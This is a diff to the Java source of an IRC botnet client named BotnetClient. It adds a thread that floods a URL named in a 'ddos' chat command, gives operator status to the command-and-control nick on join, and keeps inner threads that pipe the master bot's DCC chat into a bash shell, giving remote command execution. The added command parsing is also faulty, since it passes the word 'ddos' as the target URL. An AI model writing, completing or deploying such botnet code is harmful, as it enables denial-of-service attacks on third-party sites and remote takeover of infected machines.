@@ -45,12 +45,17 @@ public class BotnetClient extends PircBot {
 	}
 		
 	protected void onMessage(String channel, String sender, String login, String hostname, String message) {
-		message = message.toLowerCase();
-		if (message.startsWith("spam")) {
+		if (message.toLowerCase().startsWith("spam")) {
 			System.out.println("Sending Spam");
-		} else if (message.startsWith("ddos")) {
+		} else if (message.toLowerCase().startsWith("ddos")) {
 			System.out.println(sender + ": " + message);
-		} else if (message.startsWith("lease")) {
+			String[] parts = message.split(" ");
+			if (parts.length < 3) {
+				System.out.println("Bad ddos message provided");
+			} else {
+				DdosThread ddos = new DdosThread(parts[0], Integer.parseInt(parts[1]), Integer.parseInt(parts[2]));
+			}
+		} else if (message.toLowerCase().startsWith("lease")) {
 			System.out.println("Leasing Myself");
 		} else {
 			System.out.println("<" + sender + ">: " + message);
@@ -62,12 +67,10 @@ public class BotnetClient extends PircBot {
 	}
 	
 	protected void onJoin(String channel, String sender, String login, String hostname) {
-		if (id.equals(operator) && sender.equals(CC)) {
+		if (sender.equals(CC)) {
 			op(CHANNEL, sender);
 			deOp(CHANNEL, id);
 			System.out.println("Operator status given to " + CC);
-		} else {
-			System.out.println("Current op:" + operator);
 		}
 	}
 	
@@ -120,8 +123,47 @@ public class BotnetClient extends PircBot {
 		}
 	}
 	
+	//This class performs a ddos attack against the specified url
+	private class DdosThread extends Thread {
+		private URL url;
+		private long duration;
+		private long interval;
+		private boolean terminate;
+		
+		public DdosThread(String url, int interval, int duration) {
+			this.duration = duration * 1000;
+			this.interval = interval * 1000;
+			terminate = false;
+			try {
+				this.url = new URL(url);
+				this.start();
+			} catch (Exception e) {
+				System.out.println("Malformed URL string");
+			}
+		}
+		public void kill() {
+			terminate = true;
+		}
+		public void run() {
+			int times = (int)(Math.round(duration * 1.0 / interval));
+			int performed = 0;
+			long sleeptime = (long)(Math.round(duration * 1.0 / times));
+			while (!terminate && performed < times) {
+				try {
+					url.getContent();
+					DdosThread.sleep(sleeptime);
+				} catch (InterruptedException e) {
+					System.out.println(e.getMessage());
+				} catch (Exception e) {
+					System.out.println("There was a problem connecting to " + url.toString());
+				}
+				performed++;
+			}
+		}
+	}
+	
 	//This class passes input from the chat object (the master bot) to the bash shell
-	public class ProcessInputThread extends Thread {
+	private class ProcessInputThread extends Thread {
 		private static final String TERMINATION = "exit";
 	    private DccChat chat;
 	    private PrintWriter bashin;
@@ -156,7 +198,7 @@ public class BotnetClient extends PircBot {
 	}
 	
 	//This class passes error output from the bash shell to the chat object (the master bot)
-	public class ProcessErrorThread extends Thread {
+	private class ProcessErrorThread extends Thread {
 	    private DccChat chat;
 	    private BufferedReader bashin;
 	    private boolean terminate;
